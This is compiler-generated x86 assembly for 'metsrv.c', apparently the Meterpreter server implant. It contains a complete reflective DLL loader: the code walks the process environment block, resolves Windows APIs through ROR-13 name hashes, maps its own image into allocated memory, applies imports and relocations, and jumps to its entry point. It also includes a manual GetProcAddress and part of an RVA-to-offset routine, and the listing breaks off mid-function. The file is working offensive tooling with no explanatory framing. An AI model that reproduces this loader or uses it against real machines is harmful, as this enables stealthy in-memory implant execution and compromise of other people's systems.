	.file	"metsrv.c"
	.text
	.def	_time;	.scl	3;	.type	32;	.endef
_time:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___time32, %eax
	call	*%eax
	leave
	ret
	.globl	_hAppInstance
	.bss
	.align 4
_hAppInstance:
	.space 4
	.text
	.globl	_caller
	.def	_caller;	.scl	2;	.type	32;	.endef
_caller:
	pushl	%ebp
	movl	%esp, %ebp
	movl	4(%ebp), %eax
	popl	%ebp
	ret
	.globl	_ReflectiveLoader@0
	.def	_ReflectiveLoader@0;	.scl	2;	.type	32;	.endef
_ReflectiveLoader@0:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$212, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -188(%ebp)
	call	_caller
	movl	%eax, -40(%ebp)
L8:
	movl	-40(%ebp), %eax
	movzwl	(%eax), %eax
	cmpw	$23117, %ax
	jne	L6
	movl	-40(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, -84(%ebp)
	cmpl	$63, -84(%ebp)
	jbe	L6
	cmpl	$1023, -84(%ebp)
	ja	L6
	movl	-40(%ebp), %eax
	addl	%eax, -84(%ebp)
	movl	-84(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$17744, %eax
	je	L74
L6:
	subl	$1, -40(%ebp)
	jmp	L8
L74:
	nop
	movl	-40(%ebp), %eax
	movl	%eax, -88(%ebp)
	movl	-88(%ebp), %eax
	movb	$0, (%eax)
	movl	-88(%ebp), %eax
	addl	$1, %eax
	movb	$0, (%eax)
	movl	$48, -120(%ebp)
	movl	-120(%ebp), %eax
/APP
 # 1997 "/usr/share/mingw-w64/include/psdk_inc/intrin-impl.h" 1
	movl %fs:(%eax), %eax 
 # 0 "" 2
/NO_APP
	movl	%eax, -124(%ebp)
	movl	-124(%ebp), %eax
	movl	%eax, -92(%ebp)
	movl	-92(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, -92(%ebp)
	movl	-92(%ebp), %eax
	movl	20(%eax), %eax
	movl	%eax, -52(%ebp)
	jmp	L10
L41:
	movl	-52(%ebp), %eax
	movl	40(%eax), %eax
	movl	%eax, -56(%ebp)
	movl	-52(%ebp), %eax
	movzwl	36(%eax), %eax
	movw	%ax, -34(%ebp)
	movl	$0, -60(%ebp)
	movl	-60(%ebp), %eax
	movl	%eax, -72(%ebp)
L15:
	movl	-72(%ebp), %eax
	movl	%eax, -128(%ebp)
	movl	-128(%ebp), %eax
	movl	%eax, -132(%ebp)
	movl	$13, -136(%ebp)
	andl	$31, -136(%ebp)
	movl	-136(%ebp), %eax
	movl	-132(%ebp), %edx
	movl	%eax, %ecx
	rorl	%cl, %edx
	movl	%edx, %eax
	nop
	movl	%eax, -72(%ebp)
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	cmpb	$96, %al
	jbe	L13
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %edx
	movl	-72(%ebp), %eax
	addl	%edx, %eax
	subl	$32, %eax
	movl	%eax, -72(%ebp)
	jmp	L14
L13:
	movl	-56(%ebp), %eax
	movzbl	(%eax), %eax
	movzbl	%al, %eax
	addl	%eax, -72(%ebp)
L14:
	addl	$1, -56(%ebp)
	subw	$1, -34(%ebp)
	cmpw	$0, -34(%ebp)
	jne	L15
	movl	-72(%ebp), %eax
	movl	%eax, -60(%ebp)
	cmpl	$1783282779, -60(%ebp)
	jne	L16
	movl	-52(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -92(%ebp)
	movl	-92(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-96(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-96(%ebp), %eax
	movl	32(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-96(%ebp), %eax
	movl	36(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -48(%ebp)
	movw	$4, -34(%ebp)
	movzwl	-34(%ebp), %eax
	addl	$1, %eax
	movw	%ax, -34(%ebp)
	jmp	L17
L29:
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -140(%ebp)
	movl	$0, %ebx
L20:
	movl	%ebx, -144(%ebp)
	movl	-144(%ebp), %eax
	movl	%eax, -148(%ebp)
	movl	$13, -152(%ebp)
	andl	$31, -152(%ebp)
	movl	-152(%ebp), %eax
	movl	-148(%ebp), %edx
	movl	%eax, %ecx
	rorl	%cl, %edx
	movl	%edx, %eax
	nop
	movl	%eax, %ebx
	movl	-140(%ebp), %eax
	movzbl	(%eax), %eax
	movsbl	%al, %eax
	addl	%eax, %ebx
	addl	$1, -140(%ebp)
	movl	-140(%ebp), %eax
	movzbl	(%eax), %eax
	testb	%al, %al
	jne	L20
	movl	%ebx, %eax
	movl	%eax, -100(%ebp)
	cmpl	$-334606706, -100(%ebp)
	je	L22
	cmpl	$2081291434, -100(%ebp)
	je	L22
	cmpl	$2034681371, -100(%ebp)
	je	L22
	cmpl	$-1850750380, -100(%ebp)
	je	L22
	cmpl	$251015922, -100(%ebp)
	jne	L23
L22:
	movl	-96(%ebp), %eax
	movl	28(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -104(%ebp)
	movl	-48(%ebp), %eax
	movzwl	(%eax), %eax
	movzwl	%ax, %eax
	sall	$2, %eax
	addl	%eax, -104(%ebp)
	cmpl	$-334606706, -100(%ebp)
	jne	L24
	movl	-104(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	jmp	L25
L24:
	cmpl	$2081291434, -100(%ebp)
	jne	L26
	movl	-104(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	jmp	L25
L26:
	cmpl	$2034681371, -100(%ebp)
	jne	L27
	movl	-104(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -20(%ebp)
	jmp	L25
L27:
	cmpl	$-1850750380, -100(%ebp)
	jne	L28
	movl	-104(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -24(%ebp)
	jmp	L25
L28:
	cmpl	$251015922, -100(%ebp)
	jne	L25
	movl	-104(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
L25:
	movzwl	-34(%ebp), %eax
	subl	$1, %eax
	movw	%ax, -34(%ebp)
L23:
	addl	$4, -44(%ebp)
	addl	$2, -48(%ebp)
L17:
	cmpw	$0, -34(%ebp)
	jne	L29
	jmp	L30
L16:
	cmpl	$1023043677, -60(%ebp)
	jne	L30
	movl	-52(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -92(%ebp)
	movl	-92(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-96(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-96(%ebp), %eax
	movl	32(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-96(%ebp), %eax
	movl	36(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -48(%ebp)
	movw	$1, -34(%ebp)
	jmp	L31
L38:
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -156(%ebp)
	movl	$0, %ebx
L34:
	movl	%ebx, -160(%ebp)
	movl	-160(%ebp), %eax
	movl	%eax, -164(%ebp)
	movl	$13, -168(%ebp)
	andl	$31, -168(%ebp)
	movl	-168(%ebp), %eax
	movl	-164(%ebp), %edx
	movl	%eax, %ecx
	rorl	%cl, %edx
	movl	%edx, %eax
	nop
	movl	%eax, %ebx
	movl	-156(%ebp), %eax
	movzbl	(%eax), %eax
	movsbl	%al, %eax
	addl	%eax, %ebx
	addl	$1, -156(%ebp)
	movl	-156(%ebp), %eax
	movzbl	(%eax), %eax
	testb	%al, %al
	jne	L34
	movl	%ebx, %eax
	movl	%eax, -100(%ebp)
	cmpl	$1397492408, -100(%ebp)
	jne	L36
	movl	-96(%ebp), %eax
	movl	28(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -104(%ebp)
	movl	-48(%ebp), %eax
	movzwl	(%eax), %eax
	movzwl	%ax, %eax
	sall	$2, %eax
	addl	%eax, -104(%ebp)
	cmpl	$1397492408, -100(%ebp)
	jne	L37
	movl	-104(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -28(%ebp)
L37:
	movzwl	-34(%ebp), %eax
	subl	$1, %eax
	movw	%ax, -34(%ebp)
L36:
	addl	$4, -44(%ebp)
	addl	$2, -48(%ebp)
L31:
	cmpw	$0, -34(%ebp)
	jne	L38
L30:
	cmpl	$0, -12(%ebp)
	je	L39
	cmpl	$0, -16(%ebp)
	je	L39
	cmpl	$0, -20(%ebp)
	je	L39
	cmpl	$0, -24(%ebp)
	je	L39
	cmpl	$0, -32(%ebp)
	je	L39
	cmpl	$0, -28(%ebp)
	jne	L75
L39:
	movl	-52(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -52(%ebp)
L10:
	cmpl	$0, -52(%ebp)
	jne	L41
	jmp	L40
L75:
	nop
L40:
	movl	-40(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -84(%ebp)
	movl	-84(%ebp), %eax
	movl	80(%eax), %eax
	movl	$4, 12(%esp)
	movl	$12288, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$0, (%esp)
	movl	-24(%ebp), %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -92(%ebp)
	movl	-84(%ebp), %eax
	movl	80(%eax), %edx
	movl	-92(%ebp), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	-32(%ebp), %eax
	call	*%eax
	subl	$8, %esp
	movl	-84(%ebp), %eax
	movl	84(%eax), %eax
	movl	%eax, -52(%ebp)
	movl	-40(%ebp), %eax
	movl	%eax, -56(%ebp)
	movl	-92(%ebp), %eax
	movl	%eax, -60(%ebp)
	jmp	L42
L43:
	movl	-56(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -56(%ebp)
	movl	%eax, %ecx
	movl	-60(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -60(%ebp)
	movl	%eax, %edx
	movzbl	(%ecx), %eax
	movb	%al, (%edx)
L42:
	movl	-52(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -52(%ebp)
	testl	%eax, %eax
	jne	L43
	movl	-92(%ebp), %eax
	movl	%eax, -108(%ebp)
	movl	-84(%ebp), %eax
	movl	84(%eax), %eax
	movl	%eax, -112(%ebp)
	movl	-84(%ebp), %eax
	addl	$24, %eax
	movl	%eax, %edx
	movl	-84(%ebp), %eax
	movzwl	20(%eax), %eax
	movzwl	%ax, %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	movl	-84(%ebp), %eax
	movzwl	6(%eax), %eax
	movzwl	%ax, %eax
	movl	%eax, -68(%ebp)
	jmp	L44
L52:
	movl	-52(%ebp), %eax
	movl	%eax, -172(%ebp)
	movl	$0, %ebx
L47:
	movl	%ebx, -176(%ebp)
	movl	-176(%ebp), %eax
	movl	%eax, -180(%ebp)
	movl	$13, -184(%ebp)
	andl	$31, -184(%ebp)
	movl	-184(%ebp), %eax
	movl	-180(%ebp), %edx
	movl	%eax, %ecx
	rorl	%cl, %edx
	movl	%edx, %eax
	nop
	movl	%eax, %ebx
	movl	-172(%ebp), %eax
	movzbl	(%eax), %eax
	movsbl	%al, %eax
	addl	%eax, %ebx
	addl	$1, -172(%ebp)
	movl	-172(%ebp), %eax
	movzbl	(%eax), %eax
	testb	%al, %al
	jne	L47
	movl	%ebx, %eax
	movl	%eax, -100(%ebp)
	cmpl	$-339543628, -100(%ebp)
	jne	L49
	movl	-52(%ebp), %eax
	movl	12(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -76(%ebp)
	movl	-52(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -80(%ebp)
L49:
	movl	-52(%ebp), %eax
	movl	12(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -56(%ebp)
	movl	-52(%ebp), %eax
	movl	20(%eax), %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -60(%ebp)
	movl	-52(%ebp), %eax
	movl	16(%eax), %eax
	movl	%eax, -64(%ebp)
	jmp	L50
L51:
	movl	-60(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -60(%ebp)
	movl	%eax, %ecx
	movl	-56(%ebp), %eax
	leal	1(%eax), %edx
	movl	%edx, -56(%ebp)
	movl	%eax, %edx
	movzbl	(%ecx), %eax
	movb	%al, (%edx)
L50:
	movl	-64(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -64(%ebp)
	testl	%eax, %eax
	jne	L51
	addl	$40, -52(%ebp)
L44:
	movl	-68(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -68(%ebp)
	testl	%eax, %eax
	jne	L52
	movl	-84(%ebp), %eax
	subl	$-128, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -60(%ebp)
	jmp	L53
L59:
	movl	-60(%ebp), %eax
	movl	12(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, (%esp)
	movl	-12(%ebp), %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -40(%ebp)
	cmpl	$0, -40(%ebp)
	jne	L54
	addl	$20, -60(%ebp)
	jmp	L53
L54:
	movl	-60(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -64(%ebp)
	movl	-60(%ebp), %eax
	movl	16(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	jmp	L55
L58:
	cmpl	$0, -64(%ebp)
	je	L56
	movl	-64(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jns	L56
	movl	-40(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-96(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	(%eax), %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -96(%ebp)
	movl	-96(%ebp), %eax
	movl	28(%eax), %edx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -104(%ebp)
	movl	-64(%ebp), %eax
	movl	(%eax), %eax
	movzwl	%ax, %edx
	movl	-96(%ebp), %eax
	movl	16(%eax), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%eax, -104(%ebp)
	movl	-104(%ebp), %eax
	movl	(%eax), %ecx
	movl	-52(%ebp), %eax
	movl	-40(%ebp), %edx
	addl	%ecx, %edx
	movl	%edx, (%eax)
	jmp	L57
L56:
	movl	-52(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	leal	2(%eax), %edx
	movl	-40(%ebp), %eax
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	-16(%ebp), %eax
	call	*%eax
	subl	$8, %esp
	movl	%eax, %edx
	movl	-52(%ebp), %eax
	movl	%edx, (%eax)
L57:
	addl	$4, -52(%ebp)
	cmpl	$0, -64(%ebp)
	je	L55
	addl	$4, -64(%ebp)
L55:
	movl	-52(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L58
	addl	$20, -60(%ebp)
L53:
	movl	-60(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L59
	movl	-84(%ebp), %eax
	movl	52(%eax), %eax
	movl	-92(%ebp), %edx
	subl	%eax, %edx
	movl	%edx, %eax
	movl	%eax, -40(%ebp)
	movl	-84(%ebp), %eax
	addl	$160, %eax
	movl	%eax, -56(%ebp)
	movl	-56(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L60
	movl	-56(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -68(%ebp)
	movl	-56(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -60(%ebp)
	jmp	L61
L68:
	movl	-60(%ebp), %eax
	movl	(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	movl	-60(%ebp), %eax
	movl	4(%eax), %eax
	subl	$8, %eax
	shrl	%eax
	movl	%eax, -56(%ebp)
	movl	-60(%ebp), %eax
	addl	$8, %eax
	movl	%eax, -64(%ebp)
	jmp	L62
L67:
	movl	-64(%ebp), %eax
	movzbl	1(%eax), %eax
	andl	$-16, %eax
	cmpb	$-96, %al
	jne	L63
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %edx
	movl	-52(%ebp), %eax
	addl	%edx, %eax
	movl	(%eax), %edx
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %ecx
	movl	-52(%ebp), %eax
	addl	%ecx, %eax
	movl	%eax, %ecx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, (%ecx)
	jmp	L64
L63:
	movl	-64(%ebp), %eax
	movzbl	1(%eax), %eax
	andl	$-16, %eax
	cmpb	$48, %al
	jne	L65
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %edx
	movl	-52(%ebp), %eax
	addl	%edx, %eax
	movl	(%eax), %edx
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %ecx
	movl	-52(%ebp), %eax
	addl	%ecx, %eax
	movl	%eax, %ecx
	movl	-40(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, (%ecx)
	jmp	L64
L65:
	movl	-64(%ebp), %eax
	movzbl	1(%eax), %eax
	andl	$-16, %eax
	cmpb	$16, %al
	jne	L66
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %edx
	movl	-52(%ebp), %eax
	addl	%edx, %eax
	movzwl	(%eax), %edx
	movl	-40(%ebp), %eax
	shrl	$16, %eax
	movl	%eax, %ebx
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %ecx
	movl	-52(%ebp), %eax
	addl	%ecx, %eax
	movl	%eax, %ecx
	leal	(%edx,%ebx), %eax
	movw	%ax, (%ecx)
	jmp	L64
L66:
	movl	-64(%ebp), %eax
	movzbl	1(%eax), %eax
	andl	$-16, %eax
	cmpb	$32, %al
	jne	L64
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %edx
	movl	-52(%ebp), %eax
	addl	%edx, %eax
	movzwl	(%eax), %edx
	movl	-40(%ebp), %eax
	movl	%eax, %ebx
	movl	-64(%ebp), %eax
	movzwl	(%eax), %eax
	andw	$4095, %ax
	movzwl	%ax, %ecx
	movl	-52(%ebp), %eax
	addl	%ecx, %eax
	movl	%eax, %ecx
	leal	(%edx,%ebx), %eax
	movw	%ax, (%ecx)
L64:
	addl	$2, -64(%ebp)
L62:
	movl	-56(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -56(%ebp)
	testl	%eax, %eax
	jne	L67
	movl	-60(%ebp), %eax
	movl	4(%eax), %eax
	subl	%eax, -68(%ebp)
	movl	-60(%ebp), %eax
	movl	4(%eax), %eax
	addl	%eax, -60(%ebp)
L61:
	cmpl	$0, -68(%ebp)
	je	L60
	movl	-60(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L68
L60:
	movl	-84(%ebp), %eax
	movl	40(%eax), %edx
	movl	-92(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -52(%ebp)
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	$-1, (%esp)
	movl	-28(%ebp), %eax
	call	*%eax
	subl	$12, %esp
	movl	-108(%ebp), %eax
	leal	-188(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	$32, 8(%esp)
	movl	-112(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	-20(%ebp), %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -116(%ebp)
	cmpl	$0, -116(%ebp)
	jne	L69
	movl	$0, %eax
	jmp	L72
L69:
	movl	-76(%ebp), %eax
	leal	-188(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	$32, 8(%esp)
	movl	-80(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	-20(%ebp), %eax
	call	*%eax
	subl	$16, %esp
	movl	%eax, -116(%ebp)
	cmpl	$0, -116(%ebp)
	jne	L71
	movl	$0, %eax
	jmp	L72
L71:
	movl	-52(%ebp), %eax
	movl	-92(%ebp), %edx
	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
	subl	$12, %esp
	movl	-52(%ebp), %eax
L72:
	movl	-4(%ebp), %ebx
	leave
	ret
	.globl	_GetProcAddressR@8
	.def	_GetProcAddressR@8;	.scl	2;	.type	32;	.endef
_GetProcAddressR@8:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$0, -28(%ebp)
	movl	$0, -12(%ebp)
	cmpl	$0, 8(%ebp)
	jne	L77
	movl	$0, %eax
	jmp	L78
L77:
	movl	8(%ebp), %eax
	movl	%eax, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -36(%ebp)
	movl	$0, -40(%ebp)
	movl	$0, -44(%ebp)
	movl	-28(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -36(%ebp)
	movl	-36(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -40(%ebp)
	movl	-40(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -44(%ebp)
	movl	-44(%ebp), %eax
	movl	28(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
	movl	-44(%ebp), %eax
	movl	32(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	movl	-44(%ebp), %eax
	movl	36(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -20(%ebp)
	movl	12(%ebp), %eax
	shrl	$16, %eax
	testl	%eax, %eax
	jne	L79
	movl	12(%ebp), %eax
	movzwl	%ax, %edx
	movl	-44(%ebp), %eax
	movl	16(%eax), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	jmp	L84
L79:
	movl	-44(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, -24(%ebp)
	jmp	L81
L83:
	movl	-16(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -48(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-48(%ebp), %eax
	movl	%eax, (%esp)
	call	_strcmp
	testl	%eax, %eax
	jne	L82
	movl	-20(%ebp), %eax
	movzwl	(%eax), %eax
	movzwl	%ax, %eax
	sall	$2, %eax
	addl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	(%eax), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	jmp	L84
L82:
	addl	$4, -16(%ebp)
	addl	$2, -20(%ebp)
L81:
	movl	-24(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -24(%ebp)
	testl	%eax, %eax
	jne	L83
L84:
	movl	-12(%ebp), %eax
L78:
	leave
	ret	$8
	.globl	_Rva2Offset
	.def	_Rva2Offset;	.scl	2;	.type	32;	.endef
_Rva2Offset:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$16, %esp
	movw	$0, -2(%ebp)
	movl	$0, -8(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	cmpl	$0, 16(%ebp)
	je	L86
	movl	12(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %eax
	addl	$24, %eax
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	movzwl	20(%eax), %eax
	movzwl	%ax, %eax
	addl	%edx, %eax
	movl	%eax, -8(%ebp)
	movl	-8(%ebp), %eax
	movl	20(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jnb	L87
	movl	8(%ebp), %eax
	jmp	L88
L87:
	movw	$0, -2(%ebp)
	jmp	L89
L91:
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jb	L90
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %ecx
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	16(%eax), %eax
	addl	%ecx, %eax
	cmpl	%eax, 8(%ebp)
	jnb	L90
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %eax
	movl	8(%ebp), %edx
	movl	%edx, %ecx
	subl	%eax, %ecx
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	20(%eax), %eax
	addl	%ecx, %eax
	jmp	L88
L90:
	movzwl	-2(%ebp), %eax
	addl	$1, %eax
	movw	%ax, -2(%ebp)
L89:
	movl	-16(%ebp), %eax
	movzwl	6(%eax), %eax
	cmpw	%ax, -2(%ebp)
	jb	L91
	jmp	L92
L86:
	movl	12(%ebp), %eax
	movl	60(%eax), %eax
	movl	%eax, %edx
	movl	12(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	movl	-12(%ebp), %eax
	addl	$24, %eax
	movl	%eax, %edx
	movl	-12(%ebp), %eax
	movzwl	20(%eax), %eax
	movzwl	%ax, %eax
	addl	%edx, %eax
	movl	%eax, -8(%ebp)
	movl	-8(%ebp), %eax
	movl	20(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jnb	L93
	movl	8(%ebp), %eax
	jmp	L88
L93:
	movw	$0, -2(%ebp)
	jmp	L94
L96:
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %eax
	cmpl	%eax, 8(%ebp)
	jb	L95
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	12(%eax), %ecx
	movzwl	-2(%ebp), %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%edx, %eax
	sall	$3, %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movl	16(%eax), %eax
	addl	%ecx, %eax
